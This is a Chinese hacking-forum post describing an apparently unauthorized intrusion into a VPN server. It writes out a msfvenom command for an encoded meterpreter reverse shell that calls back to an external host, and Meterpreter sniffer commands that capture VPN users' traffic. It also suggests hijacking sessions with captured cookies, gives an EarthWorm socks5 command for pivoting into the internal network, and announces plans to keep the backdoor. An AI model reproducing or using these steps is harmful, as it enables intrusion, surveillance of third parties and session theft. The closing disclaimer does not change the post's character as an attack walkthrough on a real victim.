[i春秋作家：jasonx](https://bbs.ichunqiu.com/thread-38888-1-1.html?from=beef)  

  

前言：由于这个VPN节点服务器是之前拿到的，一直没时间做进一步渗透，昨天看到我蛋总表哥发红包，然后我运气爆表抢了个运气王，再加上好久没发文章了，所以就抽空测试下咯。  

#### 0x01 kali反弹shel进行测试

Kali生成一个payload  
这里生成IP填写的是我外网IP地址  
`msf[VENOM](http://www.ichunqiu.com/course/293?bbs) -p
windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5
LHOST=111.111.111.111 LPORT=8082 -f exe > test.exe`

![image.png](https://image.3001.net/images/20180418/15240326846972.png!small)  

然后kali进行监听设置  
由于我这里是做了端口映射的，所以填的IP地址就是kali的地址

当payload运行后，主动连接我的外网地址，然后路由器通过端口映射找到我的kali，然后建立连接。（没有公网服务器的也可以用这个方法）

![image.png](https://image.3001.net/images/20180418/15240326965798.png!small)  

把kali生成的后门上传到到对方服务器上运行  

![image.png](https://image.3001.net/images/20180418/15240327056106.png!small)  

运行后，我们返回kali可以看到已经成功反弹shell  

  

Netstat-bn查下网络连接信息  

![image.png](https://image.3001.net/images/20180418/15240327297919.png!small)  

可以看到有几个人连接到1723端口（这个是pptp的拨号端口）

由于连接信息很多，我们可以用以下命令 过滤出想要的端口信息。

`netstat -n -p tcp |find "1723"`

![image.png](https://image.3001.net/images/20180418/15240328044275.png!small)  
  

突然有个想法，既然有人连接到这个VPN服务器，如果我抓取这台服务器的数据包，是否能搞到这些人连上vpn后都干了啥呢？  

#### 0x02 kali进行抓包分析

说干就干，我们在kali里面进行抓包设置  
首先输入ipconfig /all列出网卡信息  
82579LM这个是他的本地连接的网卡

然后我们输入use sniffer

可以看到网卡号82579LM序号为1

![image.png](https://image.3001.net/images/20180418/15240328449882.png!small)  

接着输入sniffer_start 1 （开始在序号为1的网卡上抓包）

然后隔一段时间，我们去下载抓取到的数据包到我们的kali。

命令：sniffer_dump 1 xpsp1.cap

![image.png](https://image.3001.net/images/20180418/15240328533340.png!small)  

下载完以后，在kali主目录下双击打开xpsp1.cap文件。  

![image.png](https://image.3001.net/images/20180418/15240328673640.png!small)  

但是我发现抓到的数据包里面并没有GET或者POST请求

如果能抓到GET或者POST请求的话，比如你看到请求里面有cookie，那么我们可以用这个cookie直接登录对方登录过的网站。参考我的上一篇文章[【蹭你wifi后
我竟然干了这样的事】](https://bbs.ichunqiu.com/thread-38888-1-1.html?from=beef)

![image.png](https://image.3001.net/images/20180418/15240328747309.png!small)  

突然感觉没啥思路了，看来我要拜师学习了。^_^

#### 0x03 VPN地址给我的灵感

看到这个ppp的虚拟网卡信息，加上前面抓包看到的172.16.11.7和vpn服务器产生的流量信息，我们可以知道，他的vpn虚拟内网就是172.16.11.0/24

![image.png](https://image.3001.net/images/20180418/15240328876961.png!small)  

为了验证我的想法，我们建立一个socks5代理，然后用SocksCap64连上去  
这里用到的工具是EarthWorm，由于这是一台有外网的服务器，我们直接正向代理就可以了。EW使用方法可以参考[【对微信卖小电影的一次内网漫游】](https://bbs.ichunqiu.com/thread-38888-1-1.html?from=beef)

命令如下：

`ew.exe -s ssocksd -l 888`

解释：在服务器上开启一个socks5代理，端口为888

现在用SocksCap64连上去，把我们的[渗透工具](https://bbs.ichunqiu.com/thread-38888-1-1.html?from=beef)放进SocksCap64里面，这样就可以通过这个代理直接搞内网了。  
然后就是你懂的，哈哈^_^

![image.png](https://image.3001.net/images/20180418/15240328972545.png!small)  

好可怕，套了这么多层服务器搞事情，你认为就安全了？ 然而在第一层的vpn就出卖了你，后面你套10层都没用。

这么怕自己的信息泄露，那么这是在干啥好事呢？  
大家自行脑补吧……

![image.png](https://image.3001.net/images/20180418/1524032904935.png!small)  

还有扫号的，黑产真可怕。  

![image.png](https://image.3001.net/images/20180418/15240329352557.png!small)  

本来还有很多方法可以进行下一步渗透的，但是最近真的很忙，没时间搞了，抽空维护好后门，以后有的是机会，对吧。哈哈。

求赞，求赞，求赞，赞我的妹子越来越漂亮，赞我的表哥丁丁增长5cm。٩(๑❛ᴗ❛๑)۶

用到的工具：链接:
[https://pan.baidu.com/s/14iv3_H5POejr_enjV0Wv2w](https://bbs.ichunqiu.com/thread-38888-1-1.html?from=beef)  
请勿用于非法用途，一切后果自负。  
密码在此：https://bbs.ichunqiu.com/thread-38888-1-1.html?from=beef

总结：  
一、你以为套个vpn就能很安全的搞事情？对不起，vpn服务器被拿下了，搞你也是分分钟的事。

二、你以为在虚拟机就安全了？对不起，拿到你虚拟机，然后扫所有内网段，只要虚拟机能访问你本机的局域网，一样可以干掉你。

三、那么真的就没有其他办法让我们安全的搞事情了吗？，答案肯定是有的，但是方法呢，请自行百度吧，说出来有一定的风险，传播【vpn搭建方法】可是要查水表的，哈哈。

